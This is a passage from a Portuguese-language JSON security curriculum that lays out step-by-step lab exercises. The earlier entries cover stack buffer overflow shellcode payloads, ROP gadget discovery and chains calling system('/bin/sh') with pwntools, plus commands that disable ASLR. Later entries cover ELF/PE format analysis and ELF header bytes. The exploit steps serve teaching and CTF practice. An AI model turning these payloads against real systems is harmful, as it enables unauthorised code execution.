                                  "stepNumber": 4,
                                  "title": "Construir payload com shellcode e redirecionamento de RET",
                                  "subSteps": [
                                    "Crie payload: junk (offset bytes) + RET address (endereço do shellcode) + NOP sled (100 bytes) + shellcode.",
                                    "Em Python: payload = b'A'*offset + p32(buffer_addr) + b'\\x90'*100 + shellcode.",
                                    "Garanta NOP sled antes do shellcode para slide se offset ligeiramente errado.",
                                    "Teste em gdb: run < payload; stepi até RET jump para shellcode.",
                                    "Ajuste endereço se necessário (stack alignment)."
                                  ],
                                  "verification": "Em gdb, RET salta para NOP/shellcode; execução flui para shellcode sem crash.",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "Python3",
                                    "pwntools (opcional)",
                                    "gdb"
                                  ],
                                  "tips": "Use struct.pack('<I', addr) para little-endian 32-bit.",
                                  "learningObjective": "Montar exploit payload clássico com retorno para shellcode.",
                                  "commonMistakes": [
                                    "Endereço em big-endian",
                                    "Sem NOP sled",
                                    "Shellcode com nulls cortando payload"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Executar exploit e validar execução do shellcode",
                                  "subSteps": [
                                    "Execute ./vuln < payload; confirme shell interativo (id; exit).",
                                    "Em gdb: disas $eip após jump; confirme execve syscall.",
                                    "Teste estabilidade: rode 5x sem ASLR para reprodutibilidade.",
                                    "Analise com strace para ver execve('/bin/sh').",
                                    "Documente payload final e lições aprendidas."
                                  ],
                                  "verification": "Shell spawna com uid do processo; comandos como 'whoami' funcionam.",
                                  "estimatedTime": "15 minutes",
                                  "materials": [
                                    "./vuln",
                                    "payload.py",
                                    "strace",
                                    "gdb"
                                  ],
                                  "tips": "Redirecione stdin: python payload.py > input; ./vuln < input.",
                                  "learningObjective": "Validar sucesso do exploit e depurar falhas.",
                                  "commonMistakes": [
                                    "Permissões erradas",
                                    "Stack não executável",
                                    "ASLR reativado"
                                  ]
                                }
                              ],
                              "practicalExample": "Programa C: #include <string.h>; int main(int argc, char** argv){char buf[64];strcpy(buf,argv[1]);}. Compile sem proteções. Shellcode: \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68... (23 bytes). Offset: 76. Payload Python: p = b'A'*76 + p32(0xffffd000) + b'\\x90'*100 + shellcode; print(p). Result: ./vuln $(python3 -c 'print(p)') -> $ shell.",
                              "finalVerifications": [
                                "Shellcode isolado abre /bin/sh sem erros.",
                                "Offset exato controla EIP em gdb.",
                                "RET address aponta corretamente para buffer via 'x/1gx $esp'.",
                                "Exploit spawna shell interativo 100% das vezes.",
                                "strace confirma syscall execve('/bin/sh').",
                                "Explicar diferenças com NX on (necessita ROP)."
                              ],
                              "assessmentCriteria": [
                                "Shellcode correto e sem null bytes (teste standalone).",
                                "Offset preciso determinado via pattern/crash analysis.",
                                "Payload inclui NOP sled, shellcode e RET válido.",
                                "Ambiente configurado corretamente (checksec=0 proteções).",
                                "Exploit reproduzível; depuração mostra fluxo correto.",
                                "Documentação clara de endereços e ajustes."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: Escrita de shellcode e syscalls.",
                                "Programação C: Vulnerabilidades de buffer e compilação.",
                                "Debugging: Uso avançado de gdb/peda para reverse engineering.",
                                "Redes/Sistemas Operacionais: ASLR, NX e proteções modernas.",
                                "Ética em Segurança: Entender exploits para defesa."
                              ],
                              "realWorldApplication": "Em pentests éticos (ex: CTFs, bug bounties), demonstrar impactos de buffer overflows em software legacy sem proteções, ajudando a priorizar patches e implementar W^X, ASLR e canaries em desenvolvimento seguro."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.5.3.2",
                            "name": "Identificar gadgets ROP",
                            "description": "Usar ROPgadget ou rp++ para encontrar gadgets em binários ELF/PE (pop rdi; ret; etc.), analisando em 64 bits para chaining.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e instalar ferramentas",
                                  "subSteps": [
                                    "Instale o ROPgadget via pip: pip install ROPgadget",
                                    "Instale rp++ clonando o repositório do GitHub: git clone https://github.com/RoderickBacon/rp-lin-x64-ropgdb.git e siga as instruções de build",
                                    "Instale dependências como pwntools: pip install pwntools",
                                    "Baixe um binário ELF 64-bit de exemplo vulnerável (ex: de pwn.college ou crie um simples com buffer overflow)",
                                    "Verifique a arquitetura com file <binario> para confirmar ELF x86-64"
                                  ],
                                  "verification": "Execute ROPgadget --version e rp++ --help sem erros; confirme binário é ELF 64-bit com readelf -h <binario>",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Python 3+",
                                    "Git",
                                    "Binário ELF 64-bit de exemplo"
                                  ],
                                  "tips": "Use um ambiente virtual com virtualenv para isolar dependências; prefira distribuições Linux como Ubuntu para compatibilidade",
                                  "learningObjective": "Configurar ferramentas essenciais para análise ROP em binários ELF/PE",
                                  "commonMistakes": [
                                    "Instalar em ambiente sem privilégios de root desnecessários",
                                    "Ignorar verificação de arquitetura 64-bit",
                                    "Usar binários 32-bit por engano"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar o binário e preparar para busca de gadgets",
                                  "subSteps": [
                                    "Execute readelf -h <binario> para detalhes do cabeçalho ELF",
                                    "Use objdump -d <binario> | grep -i ret para pré-visualizar instruções de retorno",
                                    "Desative ASLR temporariamente com echo 0 | sudo tee /proc/sys/kernel/randomize_va_space",
                                    "Carregue o binário em um disassembler como Ghidra ou radare2 para contexto",
                                    "Identifique seções .text e .plt com readelf -S <binario>"
                                  ],
                                  "verification": "Liste seções relevantes e confirme presença de instruções como 'ret' em disassembly",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "readelf",
                                    "objdump",
                                    "Ghidra ou radare2",
                                    "Binário ELF"
                                  ],
                                  "tips": "Salve outputs em arquivos txt para referência futura; foque em bibliotecas como libc para gadgets comuns",
                                  "learningObjective": "Entender estrutura ELF e identificar regiões candidatas a gadgets ROP",
                                  "commonMistakes": [
                                    "Não desabilitar ASLR levando a endereços inconsistentes",
                                    "Confundir seções .text com .data",
                                    "Ignorar dependências de bibliotecas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar ROPgadget para encontrar gadgets em ELF 64-bit",
                                  "subSteps": [
                                    "Execute ROPgadget --binary <binario> para lista completa de gadgets",
                                    "Filtre por gadgets úteis: ROPgadget --binary <binario> --string '/bin/sh' ou --only 'pop|ret'",
                                    "Busque especificamente pop rdi; ret: ROPgadget --binary <binario> | grep 'pop rdi ; ret'",
                                    "Salve resultados: ROPgadget --binary <binario> > gadgets.txt",
                                    "Para chaining inicial, note endereços de pop rdi, pop rsi, etc."
                                  ],
                                  "verification": "Identifique e liste pelo menos 3 gadgets como 'pop rdi ; ret' com seus endereços hexadecimais",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "ROPgadget instalado",
                                    "Binário ELF 64-bit"
                                  ],
                                  "tips": "Use --depth 10 para chains mais longos; combine com ROPgadget --libs para gadgets de ld.so",
                                  "learningObjective": "Usar ROPgadget para extrair gadgets ROP específicos em binários 64-bit",
                                  "commonMistakes": [
                                    "Buscar em binários errados (ex: stripped sem símbolos)",
                                    "Ignorar bad chars em payloads",
                                    "Não filtrar por arquitetura"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar gadgets com rp++ e planejar ROP chain",
                                  "subSteps": [
                                    "Execute rp++ -f <binario> para interface interativa de gadgets",
                                    "Navegue e busque 'pop rdi', 'ret' em modo ROP mode",
                                    "Para PE (se aplicável): converta ou use ROPgadget --binary <pe.exe> --format pe",
                                    "Monte um chain simples: pop rdi -> addr('/bin/sh') -> system addr",
                                    "Valide com pwntools: from pwn import *; p = process('./binario'); chain = p64(pop_rdi) + p64(binsh) + p64(system)"
                                  ],
                                  "verification": "Crie um script pwntools que liste e use 3+ gadgets em um chain válido sem crash",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "rp++ instalado",
                                    "pwntools",
                                    "Binário ELF/PE"
                                  ],
                                  "tips": "Teste chains em GDB com gef-pwndbg para visualização; priorize gadgets sem side-effects",
                                  "learningObjective": "Analisar e chainar gadgets ROP para execução arbitrária em 64-bit",
                                  "commonMistakes": [
                                    "Usar gadgets com registradores sujos",
                                    "Erro em endianness little-endian",
                                    "Esquecer alinhamento stack 16 bytes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF 64-bit 'vuln' com buffer overflow e system() na plt, execute ROPgadget --binary vuln | grep 'pop rdi ; ret' para encontrar 0x40119b. Chain: pop_rdi (0x40119b) + '/bin/sh' addr + system (0x401050), permitindo shell sem DEP bypass completo.",
                              "finalVerifications": [
                                "Liste 5+ gadgets únicos com endereços e assembly exato",
                                "Explique como 'pop rdi ; ret' prepara argumento para system()",
                                "Crie um ROP chain de 3 etapas que chame system('/bin/sh')",
                                "Valide chain em GDB sem segfault",
                                "Compare resultados ROPgadget vs rp++ para consistência",
                                "Identifique gadgets em binário PE equivalente se fornecido"
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração de gadgets (endereços corretos, sem falsos positivos)",
                                "Compreensão de convenções de chamada x86-64 (rdi primeiro arg)",
                                "Efetividade do chain em payload prático (executa shell)",
                                "Análise de filtros e opções de ferramentas usadas corretamente",
                                "Detecção de erros comuns como gadgets inválidos ou desalinhados",
                                "Documentação clara de steps e verificações"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64: compreensão de registradores e instruções pop/ret",
                                "Análise de Binários: uso de objdump/readelf para inspeção ELF/PE",
                                "Exploração de Vulnerabilidades: buffer overflow e bypass DEP",
                                "Programação em Python: scripts pwntools para automação ROP",
                                "Segurança de Sistemas Operacionais: ASLR, NX e mitigações ROP"
                              ],
                              "realWorldApplication": "Em CTFs (pwn.college, HackTheBox) ou pentests reais, identificar gadgets ROP permite explorar buffer overflows em serviços como web servers ou setuid binaries, chaining para RCE mesmo com proteções parciais como Canary ou Partial ASLR."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.5.3.3",
                            "name": "Construir chain ROP para shell",
                            "description": "Montar payload ROP para chamar system(\"/bin/sh\") ou mprotect para tornar shellcode executável, testando contra proteções modernas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Análise Inicial do Binário e Reconhecimento de Proteções",
                                  "subSteps": [
                                    "Execute 'checksec' no binário para identificar proteções como NX, ASLR, PIE e RELRO",
                                    "Use 'ldd' ou 'readelf' para mapear dependências de bibliotecas como libc",
                                    "Descompile com 'objdump -d' ou Ghidra para entender o fluxo de controle e pontos de overflow",
                                    "Desative ASLR temporariamente com 'echo 0 > /proc/sys/kernel/randomize_va_space' para testes locais",
                                    "Identifique o offset do buffer overflow usando gdb e cyclic patterns (ex: pwntools cyclic)"
                                  ],
                                  "verification": "Relatório com proteções listadas, offset confirmado e endereços base de libc anotados",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Binário vulnerável",
                                    "GDB-Peda",
                                    "pwntools",
                                    "ROPgadget",
                                    "checksec.sh",
                                    "cyclic from pwntools"
                                  ],
                                  "tips": "Sempre rode em ambiente virtualizado (ex: Docker) para isolar testes de exploits",
                                  "learningObjective": "Mapear o ambiente de memória e identificar vulnerabilidades iniciais",
                                  "commonMistakes": [
                                    "Ignorar proteções como Canary ou PIE",
                                    "Não confirmar offset exato levando a crashes",
                                    "Executar sem ASLR desabilitado inicialmente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificação de Gadgets ROP e Endereços Necessários",
                                  "subSteps": [
                                    "Execute 'ROPgadget --binary vuln' para listar gadgets como 'pop rdi; ret;'",
                                    "Localize endereço de '/bin/sh' na libc com 'ROPgadget --string \"/bin/sh\"' ou gdb 'find &system,+9999999,\"/bin/sh\"'",
                                    "Encontre endereço da função system() via 'gdb -q vuln' e 'info proc mappings' ou pwntools",
                                    "Colete gadgets adicionais se necessário (ex: pop rsi; pop r15; ret; para alinhamento)",
                                    "Anote endereços em uma tabela: gadget_pop_rdi, system_addr, binsh_addr"
                                  ],
                                  "verification": "Tabela completa com pelo menos 3 gadgets válidos e endereços confirmados sem leaks",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "ROPgadget",
                                    "one_gadget",
                                    "GDB com gef/peda",
                                    "pwntools",
                                    "Libc database (ex: libc.lds)"
                                  ],
                                  "tips": "Use 'ROPgadget --chain \"pop rdi\"' para chains prontas; priorize gadgets de libc para bypass NX",
                                  "learningObjective": "Selecionar gadgets primitivos para controle de registradores e chamadas de função",
                                  "commonMistakes": [
                                    "Gadgets inválidos (ex: terminam em call não-ret)",
                                    "Endereços errados devido a ASLR",
                                    "Esquecer alinhamento de stack (8 bytes em x64)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construção da Payload ROP Chain",
                                  "subSteps": [
                                    "Escreva script Python com pwntools: context.binary='vuln'; p = process('./vuln')",
                                    "Preencha padding até ROP (ex: b'A'*offset)",
                                    "Monte chain: p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)",
                                    "Adicione dummy values se chain mais longa (ex: pop rsi; ret; + 0x0)",
                                    "Envie payload via p.sendline(payload) e interaja com p.interactive()"
                                  ],
                                  "verification": "Script Python funcional que gera payload sem erros de sintaxe",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Python 3",
                                    "pwntools (pip install pwntools)",
                                    "Editor como VSCode"
                                  ],
                                  "tips": "Use p64() para little-endian; teste chain em gdb com 'r < payload' primeiro",
                                  "learningObjective": "Montar sequências ROP precisas para argumentos de função como system()",
                                  "commonMistakes": [
                                    "Ordem errada de gadgets (rdi antes de system)",
                                    "Falta de padding levando a overwrite parcial",
                                    "Não usar p64 levando a big-endian errors"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Teste, Depuração e Adaptação contra Proteções Modernas",
                                  "subSteps": [
                                    "Teste local: Rode script e verifique spawn de shell com '$?' == 0",
                                    "Debug com gdb: 'gef-pwndbg' breakpoints em ret e stepi pela chain",
                                    "Adapte para ASLR/PIE: Use leak de leak_addr (ex: printf) para calcular offsets dinâmicos",
                                    "Teste mprotect alternativo: Chain para mprotect(rwx) + shellcode se system ausente",
                                    "Valide remotamente em servidor com ASLR full usando pwntools remote()"
                                  ],
                                  "verification": "Shell spawna consistentemente em 10 runs, com log de sucesso",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "GDB com GEF/Pwndbg",
                                    "Netcat para remote",
                                    "Servidor de teste (ex: pwn.college)"
                                  ],
                                  "tips": "Registre todos os endereços leaked; use 'vmmap' em gdb para confirmações",
                                  "learningObjective": "Depurar ROP chains e mitigar proteções reais como ASLR e RELRO",
                                  "commonMistakes": [
                                    "Não lidar com ASLR causando falhas intermitentes",
                                    "Stack misalignment crashando em ret",
                                    "Shellcode sem mprotect em NX"
                                  ]
                                }
                              ],
                              "practicalExample": "Binário 'vuln' (x64, buffer overflow 40 bytes, libc-2.27). Offset=40. Gadgets: pop_rdi_ret=0x4011e3, system=0x7ffff7a3d690, /bin/sh=0x7ffff7c12ca9. Payload: b'A'*40 + p64(0x4011e3) + p64(0x7ffff7c12ca9) + p64(0x7ffff7a3d690). Resultado: ./vuln -> $ whoami (shell interativa).",
                              "finalVerifications": [
                                "Payload spawna shell interativa sem crash em ambiente local",
                                "Chain executa system(\"/bin/sh\") com registradores corretos (rdi=binsh)",
                                "Adaptação para ASLR via leak funciona remotamente",
                                "Gadgets selecionados são 'ret'-ending e não sobrescritos por proteções",
                                "Tempo de execução <5s e reprodutível em 90% dos casos",
                                "Alternativa mprotect chain torna shellcode RWX e executa"
                              ],
                              "assessmentCriteria": [
                                "Precisão da chain: Argumentos corretos e ordem de gadgets (100%)",
                                "Cobertura de proteções: Lida com NX/ASLR/PIE explicitamente",
                                "Eficiência: Mínimo gadgets (3-5), sem padding desnecessário",
                                "Documentação: Script comentado com endereços e lógica",
                                "Robustez: Funciona local/remote, com handling de erros",
                                "Criatividade: Adaptação para cenários sem system (ex: execve)"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64: Entendimento de registradores (RDI, RSP) e instruções RET/POP",
                                "Análise Reversa: Uso de disassemblers para fluxos e símbolos",
                                "Programação em Python: Automação de exploits com pwntools",
                                "Sistemas Operacionais: Gerenciamento de memória, mmap/mprotect e chamadas system",
                                "Criptografia: Leaks para bypass ASLR relacionam com side-channels"
                              ],
                              "realWorldApplication": "Em pentests e bug bounties para demonstrar RCE em serviços legacy (ex: binários CGI vulneráveis), CTFs como pwn.college/pwnable.kr, e relatórios de vulnerabilidade para patches em software real como Apache modules ou IoT firmwares."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.3.1",
                              "10.1.4.5.3.2"
                            ]
                          },
                          {
                            "id": "10.1.4.5.3.4",
                            "name": "Analisar em formato ELF e PE",
                            "description": "Comparar exploração em ELF (Linux) vs PE (Windows), focando diferenças em seções .text e relocações para gadgets.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as estruturas básicas de ELF e PE",
                                  "subSteps": [
                                    "Estude o cabeçalho ELF (e_ident, e_type, e_machine, seções como .ehdr e .phdr) usando readelf.",
                                    "Analise o cabeçalho PE (DOS header, NT headers, optional header, seções como .text) com ferramentas como CFF Explorer ou dumpbin.",
                                    "Identifique mapeamento de seções: .text em ELF vs .text em PE.",
                                    "Compare layouts gerais: ELF é mais flexível com program headers vs PE com image sections.",
                                    "Anote diferenças chave em um documento comparativo."
                                  ],
                                  "verification": "Criar uma tabela comparativa com headers e seções principais de ambos formatos.",
                                  "estimatedTime": "2 hours",
                                  "materials": "readelf/objdump (Linux), dumpbin/CFF Explorer/PE-bear (Windows), binários de exemplo ELF/PE (ex: hello world compilado)",
                                  "tips": "Comece com binários simples sem stripping para clareza.",
                                  "learningObjective": "Diferenciar estruturas fundamentais de ELF e PE para análise posterior.",
                                  "commonMistakes": "Confundir program headers (ELF) com section headers (PE); sempre verifique endianness."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a seção .text em ELF e PE",
                                  "subSteps": [
                                    "Use objdump -d para disassemblar .text em ELF e extraia funções principais.",
                                    "Em PE, use dumpbin /disasm ou Ghidra para inspecionar .text e offsets RVA.",
                                    "Identifique prologo/epílogo de funções e chamadas em ambos.",
                                    "Compare permissões: .text é executável em ambos, mas note ASLR/DEP impactos.",
                                    "Extraia bytes hex de .text para busca manual de padrões."
                                  ],
                                  "verification": "Gerar dumps de disassembly de .text para um binário ELF e PE idêntico em funcionalidade.",
                                  "estimatedTime": "3 hours",
                                  "materials": "objdump, Ghidra/IDA Free, binários com código simples (ex: loop com calls)",
                                  "tips": "Use -M intel para sintaxe x86 consistente entre ferramentas.",
                                  "learningObjective": "Mapear e comparar conteúdo executável na seção .text entre formatos.",
                                  "commonMistakes": "Ignorar RVA em PE (use Image Base + RVA); não alinhar seções corretamente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar relocações e gadgets em ELF",
                                  "subSteps": [
                                    "Use readelf -r para listar relocações (.rela.text, tipos como R_X86_64_PC32).",
                                    "Extraia gadgets com ROPgadget ou rp++ focando em .text e PLT.",
                                    "Simule resolução de relocs com ld.so em mente (lazy binding).",
                                    "Identifique gadgets úteis para ROP: pop rdi; ret; etc.",
                                    "Teste em ambiente controlado com gdb para validar gadgets."
                                  ],
                                  "verification": "Listar 5+ gadgets e 3 relocações de um binário ELF com ROPgadget output.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": "readelf, ROPgadget/rp++, gdb, binário ELF vulnerável (ex: ret2libc demo)",
                                  "tips": "Filtre gadgets por comprimento <10 bytes para chaining eficiente.",
                                  "learningObjective": "Identificar relocações e gadgets ROP em ELF para exploração.",
                                  "commonMistakes": "Confundir relocs dinâmicos vs estáticos; gadgets inválidos pós-ASLR."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar relocações e gadgets em PE",
                                  "subSteps": [
                                    "Use dumpbin /relocations ou pefile Python para listar .reloc section.",
                                    "Encontre gadgets com ROPgadget ou manual em .text/.rdata.",
                                    "Analise import table e delay-load para bindings (vs PLT em ELF).",
                                    "Compare com ELF: PE relocs são base reloc entries (IMAGE_REL_X86_64_REL32).",
                                    "Valide gadgets em x64dbg ou WinDbg."
                                  ],
                                  "verification": "Documentar 5+ gadgets e relocs de um binário PE equivalente.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": "dumpbin, pefile lib, ROPgadget, x64dbg, binário PE (ex: Windows hello.exe)",
                                  "tips": "Considere IAT hooking em PE para gadgets alternativos.",
                                  "learningObjective": "Dominar detecção de relocações e gadgets em PE contrastando com ELF.",
                                  "commonMistakes": "Esquecer de ajustar por ImageBase em PE; relocs só aplicadas em runtime."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Comparar diferenças e implicações para ROP chaining",
                                  "subSteps": [
                                    "Compile tabela: .text layout, reloc tipos, gadget density ELF vs PE.",
                                    "Discuta impactos: ELF PLT mais gadgets vs PE IAT mais previsível.",
                                    "Simule ROP chain cross-platform (ex: system() call).",
                                    "Avalie mitigações: CFI em ambos, mas ELF mais maduro com RELRO.",
                                    "Escreva relatório síntese com exemplos."
                                  ],
                                  "verification": "Produzir relatório comparativo com pelo menos 10 diferenças chave.",
                                  "estimatedTime": "2 hours",
                                  "materials": "Binários pareados ELF/PE, editor de texto, ferramentas anteriores",
                                  "tips": "Use diff de outputs de ferramentas para automação.",
                                  "learningObjective": "Sintetizar diferenças para estratégias de exploração adaptáveis.",
                                  "commonMistakes": "Generalizar sem testar; ignorar arch (x86 vs x64)."
                                }
                              ],
                              "practicalExample": "Baixe ou compile 'hello world' em GCC (ELF) e MSVC (PE). Use objdump/readelf no ELF para .text e relocs, encontrando gadget 'pop rax; ret'. No PE, dumpbin /disasm e /relocs para equivalente, notando RVA adjustments. Construa ROP chain simples para leak address em ambos.",
                              "finalVerifications": [
                                "Identificar e listar 5 diferenças chave em .text entre ELF e PE.",
                                "Extrair e validar pelo menos 3 gadgets ROP de cada formato.",
                                "Explicar como relocações afetam gadget discovery em runtime.",
                                "Criar tabela comparativa de headers e seções relevantes.",
                                "Simular ROP chain básico em gdb/x64dbg para ambos.",
                                "Discutir mitigações como RELRO (ELF) vs SafeSEH (PE)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de estruturas e seções (90%+ correção).",
                                "Profundidade na análise de relocações e gadgets (mínimo 5 exemplos por formato).",
                                "Qualidade da comparação: cobertura de diferenças funcionais e ROP impactos.",
                                "Uso correto e proficiente de ferramentas específicas.",
                                "Clareza no relatório: diagramas/tabelas para visualização.",
                                "Demonstração prática via simulação em debugger."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Disassembly e instruções x86/x64.",
                                "Sistemas Operacionais: Loaders dinâmicos (ld.so vs Windows loader).",
                                "Programação em Assembly/C: Entender code generation e linking.",
                                "Análise de Malware: Reverse engineering binários cross-platform."
                              ],
                              "realWorldApplication": "Em pentesting e análise de vulnerabilidades, profissionais usam essa análise para desenvolver exploits ROP em binários Linux/Windows, como em CTFs (pwn challenges) ou auditorias de software legado, permitindo bypass de proteções como DEP/NX via chaining de gadgets de .text e relocs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.5",
                "name": "Formatos de Arquivos Executáveis: ELF e PE",
                "description": "Estudo dos formatos ELF e PE para arquivos executáveis em diferentes sistemas.",
                "totalSkills": 43,
                "atomicTopics": [
                  {
                    "id": "10.1.5.1",
                    "name": "Estrutura Geral do Formato ELF",
                    "description": "Visão geral da organização de arquivos ELF, incluindo cabeçalho principal, seções e segmentos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.1.1",
                        "name": "Cabeçalho Principal ELF (ELF Header)",
                        "description": "O cabeçalho inicial de um arquivo ELF que define a identidade, tipo e arquitetura do executável, servindo como ponto de entrada para a análise da estrutura geral.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.1.1",
                            "name": "Identificar a sequência mágica e campos de identificação (e_ident)",
                            "description": "Reconhecer os primeiros 16 bytes do cabeçalho ELF, incluindo a magic number (0x7F 'ELF'), classe (32/64 bits), endianness, versão e padding, usando ferramentas como hexdump ou readelf.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura do campo e_ident no cabeçalho ELF",
                                  "subSteps": [
                                    "Estude a documentação oficial do ELF (man elf ou ELF spec da System V ABI).",
                                    "Identifique os 16 bytes iniciais: byte 0: 0x7F, bytes 1-3: 'ELF', byte 4: classe (1=32-bit, 2=64-bit), byte 5: endianness (1=little, 2=big), byte 6: versão (1), bytes 7-15: padding (0x00).",
                                    "Anote o layout exato em um diagrama ou tabela para memorização visual."
                                  ],
                                  "verification": "Crie um diagrama manual do e_ident e compare com a spec oficial sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação ELF (man 5 elf ou https://refspecs.linuxfoundation.org/elf/elf.pdf)",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": "Use cores diferentes para cada campo no diagrama para facilitar a visualização.",
                                  "learningObjective": "Memorizar e entender precisamente a composição dos 16 bytes do e_ident.",
                                  "commonMistakes": "Confundir endianness com classe ou ignorar o padding como irrelevante."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter e visualizar um arquivo ELF com hexdump",
                                  "subSteps": [
                                    "Baixe ou use um binário ELF padrão como /bin/ls em Linux.",
                                    "Execute 'hexdump -C /bin/ls | head -n 1' para ver os primeiros bytes.",
                                    "Copie os primeiros 16 bytes em hexadecimal para análise."
                                  ],
                                  "verification": "Confirme que os primeiros 4 bytes são 7F 45 4C 46 (magic number).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/Unix",
                                    "Arquivo ELF (ex: /bin/ls, /usr/bin/gcc)"
                                  ],
                                  "tips": "Use 'hexdump -C' para ver bytes e ASCII lado a lado, facilitando identificação de 'ELF'.",
                                  "learningObjective": "Dominar o uso de hexdump para inspecionar cabeçalhos binários.",
                                  "commonMistakes": "Não limitar a saída com 'head' ou usar arquivo não-ELF (ex: PE no Windows)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar manualmente os campos do e_ident",
                                  "subSteps": [
                                    "No dump hex, identifique byte 0 (0x7F), 1-3 ('ELF'), 4 (classe), 5 (endianness), 6 (versão=1), 7-15 (padding=0).",
                                    "Converta valores: ex. byte 4=02 → 64-bit, byte 5=01 → little-endian.",
                                    "Registre os valores em uma tabela comparando com o diagrama do step 1."
                                  ],
                                  "verification": "Sua tabela deve matching exato com o dump e spec para o binário analisado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dump hex do step anterior",
                                    "Tabela/diagrama do step 1"
                                  ],
                                  "tips": "Use calculadora hex-decimal se necessário, mas pratique conversão mental.",
                                  "learningObjective": "Mapear bytes reais aos campos semânticos do e_ident.",
                                  "commonMistakes": "Erro de off-by-one nos índices de bytes ou confundir little/big endian."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar com readelf e praticar em múltiplos binários",
                                  "subSteps": [
                                    "Execute 'readelf -h /bin/ls' e compare seção 'ELF Header' com sua análise.",
                                    "Repita com binários 32-bit (ex: compile com -m32) e 64-bit.",
                                    "Teste um binário big-endian se disponível (ex: em cross-compile)."
                                  ],
                                  "verification": "readelf deve confirmar 100% sua análise manual em pelo menos 3 binários.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "readelf (instalado via binutils)",
                                    "Binários variados: 32/64-bit"
                                  ],
                                  "tips": "Instale binutils se necessário; use 'file /bin/ls' para pré-checar tipo.",
                                  "learningObjective": "Integrar análise manual com ferramentas automatizadas para validação.",
                                  "commonMistakes": "Assumir todos binários são little-endian 64-bit sem checar."
                                }
                              ],
                              "practicalExample": "Analise /bin/ls (64-bit little-endian): hexdump mostra 7F 45 4C 46 02 01 01 00..., readelf confirma Class: ELF64, Data: 2's complement, little endian, Version: 1.",
                              "finalVerifications": [
                                "Identificou corretamente magic bytes (7F ELF).",
                                "Classificou classe (32/64 bits) e endianness com precisão.",
                                "Verificou versão=1 e padding=0 em dumps.",
                                "Comparou manual vs readelf sem discrepâncias.",
                                "Analisou pelo menos 2 binários diferentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de todos 16 bytes (100%).",
                                "Correta interpretação semântica de cada campo (ex: 02=64-bit).",
                                "Uso correto de ferramentas sem erros de sintaxe.",
                                "Análise consistente em múltiplos exemplos.",
                                "Diagrama/tabela clara e completa."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Entender como loaders usam e_ident.",
                                "Criptografia: Detectar binários maliciosos por headers alterados.",
                                "Redes/Protocolos: Similar a magic numbers em protocolos como HTTP.",
                                "Matemática: Conversões hex/bin e endianness.",
                                "Engenharia de Software: Validação de formatos em parsers."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar ELF maliciosos por headers corrompidos; em ferramentas de segurança como antivirus ou fuzzers para validar executáveis antes de análise."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.2",
